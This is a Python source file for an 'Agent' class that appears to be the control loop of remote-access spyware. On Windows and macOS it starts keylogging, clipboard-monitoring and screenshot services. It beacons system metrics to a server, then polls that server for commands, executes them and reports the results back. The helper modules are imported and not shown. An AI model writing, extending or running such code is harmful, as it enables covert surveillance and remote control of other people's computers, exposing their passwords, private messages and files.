import platform
import time

from requests.exceptions import HTTPError
from logger import logger
from actions.system import get_metrics
from app.command_handlers import execute_command
from api.client import send_metrics, fetch_commands, update_command
from config.settings import METRICS_INTERVAL
from services.keylogger import start_keylogger_service
from services.clipboard import start_clipboard_service
from services.screenshot import start_screenshot_service

class Agent:

    def __init__(self, agent_id):
        """
        Initialize the agent with its unique ID.
        """
        self.agent_id = agent_id
        self._services_started = False

    def services(self):
        """
        Start background services for keylogging, clipboard monitoring, and screenshots.
        """
        if self._services_started:
            return

        start_keylogger_service(self.agent_id)
        start_clipboard_service(self.agent_id)
        start_screenshot_service(self.agent_id)

        self._services_started = True

    def metrics(self):
        """
        Collect and send heartbeat metrics to the server.
        """
        metrics = get_metrics()
        send_metrics(self.agent_id, metrics)
        logger.info(f"Metrics: {metrics}")

    def check_commands(self):
        """
        Check for pending commands and execute them.
        """
        try:
            commands = fetch_commands(self.agent_id)
            for cmd in commands:
                logger.info(f"Executing command: {cmd['command']}")
                status, result = execute_command(cmd)

                try:
                    update_command(cmd["id"], status, result)
                    logger.info(f"Command {cmd['id']} {status}")
                except HTTPError as http_err:
                    try:
                        resp = http_err.response
                        detail = resp.text if resp is not None else str(http_err)
                    except Exception:
                        detail = str(http_err)
                    logger.error(f"Failed to update command {cmd['id']} status due to HTTP error: {detail}")
                except Exception as update_err:
                    logger.error(f"Failed to update command {cmd['id']} status: {update_err}")

        except Exception as e:
            logger.error(f"Error checking commands: {e}")

    def run(self, stop_event=None):
        """
        Main loop to run the agent
        """
        SYSTEM = platform.system()

        while not (stop_event and stop_event.is_set()):
            try:
                self.services() if SYSTEM in ["Windows", "Darwin"] else None

                self.metrics()
                self.check_commands()
            except Exception as e:
                logger.error(f"Main loop error: {e}")

            # Use stop_event.wait so Stop from the menu bar takes effect immediately
            if stop_event:
                stop_event.wait(METRICS_INTERVAL)
            else:
                time.sleep(METRICS_INTERVAL)